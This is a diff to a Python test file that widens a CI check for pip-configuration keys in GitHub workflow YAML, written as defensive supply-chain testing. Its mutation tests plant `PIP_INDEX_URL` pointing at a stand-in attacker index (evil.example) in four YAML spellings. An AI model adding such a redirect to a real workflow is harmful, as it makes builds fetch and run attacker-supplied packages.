@@ -1490,10 +1490,13 @@ class TestDependencyDriftIsDetectable:
 
         A PIP_* key is a pip configuration channel that operates
         INDEPENDENTLY of the install line this class reads. The `env:`
-        line is anchored to end-of-line so `environment:` never matches;
-        keys are compared case-insensitively (over-catch: pip itself
-        reads only uppercase, but a lowercase `pip_*` key reads as
-        intended-for-pip to every future reader even if pip ignores it).
+        line matches as a PREFIX (`env: # comment` and the flow mapping
+        `env: {K: V}` are both valid spellings an end-of-line anchor
+        would miss — Bugbot, cycle 11); `environment:` never matches
+        because it does not start with `env:`. Keys are compared
+        case-insensitively (over-catch: pip itself reads only uppercase,
+        but a lowercase `pip_*` key reads as intended-for-pip to every
+        future reader even if pip ignores it).
         """
         offenders = []
         env_indent = None
@@ -1509,8 +1512,18 @@ class TestDependencyDriftIsDetectable:
                         offenders.append(key)
                     continue
                 env_indent = None
-            if re.match(r"^\s*-?\s*env:\s*$", raw):
-                env_indent = indent
+            header = re.match(r"^\s*-?\s*env:(.*)$", raw)
+            if header:
+                tail = header.group(1).strip()
+                if tail.startswith("{"):
+                    # Flow mapping: the keys live on this line.
+                    for tok in re.findall(r"[\w.-]+(?=\s*:)", tail):
+                        if tok.upper().startswith("PIP_"):
+                            offenders.append(tok)
+                else:
+                    # Block form (bare, or with a trailing comment): the
+                    # keys are the deeper-indented lines that follow.
+                    env_indent = indent
         return offenders
 
     def test_no_pip_environment_key_redirects_the_install(self):
@@ -1560,33 +1573,63 @@ class TestDependencyDriftIsDetectable:
         )
 
     def test_a_pip_env_key_reddens_naming_itself(self, tmp_path, monkeypatch):
-        """MUTATION ARM (env): a PIP_INDEX_URL step key reddens by name.
+        """MUTATION ARM (env): every env: spelling of a PIP_ key reddens by
+        name.
 
-        Planted exactly where it would ride silently pre-fix — a step
-        env: block on the install step — and killed by the shipped
-        tripwire, with the key's own name in the message.
+        PREDICTIONS (written before the probes run): each of the four
+        shapes below — step-level block, job-level block, trailing
+        comment on the `env:` line, and the single-line flow mapping —
+        reddens the shipped tripwire with PIP_INDEX_URL named; a
+        deployment `environment:` key is NOT an env: mapping and stays
+        unflagged. The comment and flow spellings rode the cycle-10
+        detector green (Bugbot, cycle 11): both are valid YAML an
+        end-of-line anchor cannot see.
         """
         root = self._source_repo_root()
         if root is None:
             pytest.skip("SKIPPED, NOT PASSED — not a source checkout; see "
                         "_repo_copy_carrying for the full wording.")
         workflow = root / ".github" / "workflows" / "tests.yml"
+        real_text = workflow.read_text(encoding="utf-8")
         canonical = self._ci_install_line(workflow)
-        mutated = workflow.read_text(encoding="utf-8").replace(
+
+        def assert_reddens(name, mutated_text):
+            copy = self._repo_copy_carrying(
+                tmp_path / name, workflow_text=mutated_text)
+            monkeypatch.setattr(
+                type(self), "_source_repo_root", lambda self: copy)
+            with pytest.raises(
+                    AssertionError, match="PIP ENVIRONMENT DRIFT") as exc:
+                self.test_no_pip_environment_key_redirects_the_install()
+            assert "PIP_INDEX_URL" in str(exc.value), (
+                f"the red must name the offending key; got: {exc.value}"
+            )
+
+        assert_reddens("step-block", real_text.replace(
             canonical,
             canonical + "\n        env:\n"
                         "          PIP_INDEX_URL: https://evil.example/simple",
-            1,
-        )
-        copy = self._repo_copy_carrying(
-            tmp_path / "env", workflow_text=mutated)
-        monkeypatch.setattr(type(self), "_source_repo_root", lambda self: copy)
-        with pytest.raises(AssertionError, match="PIP ENVIRONMENT DRIFT") \
-                as exc_info:
-            self.test_no_pip_environment_key_redirects_the_install()
-        assert "PIP_INDEX_URL" in str(exc_info.value), (
-            f"the red must name the offending key; got: {exc_info.value}"
-        )
+            1))
+        assert_reddens("job-block", real_text.replace(
+            "    steps:",
+            "    env:\n"
+            "      PIP_INDEX_URL: https://evil.example/simple\n"
+            "    steps:", 1))
+        assert_reddens("trailing-comment", real_text.replace(
+            canonical,
+            canonical + "\n        env: # point pip elsewhere\n"
+                        "          PIP_INDEX_URL: https://evil.example/simple",
+            1))
+        assert_reddens("flow-mapping", real_text.replace(
+            canonical,
+            canonical + "\n        env: "
+                        "{PIP_INDEX_URL: https://evil.example/simple}",
+            1))
+
+        # CONTROL: `environment:` (a deployment target) does not start
+        # with `env:` and must stay unflagged.
+        assert self._pip_environment_keys(
+            "jobs:\n  release:\n    environment: production\n") == []
 
     def test_the_three_floor_literals_agree(self):
         """Declared floor, CI cell and AST guard must move together.
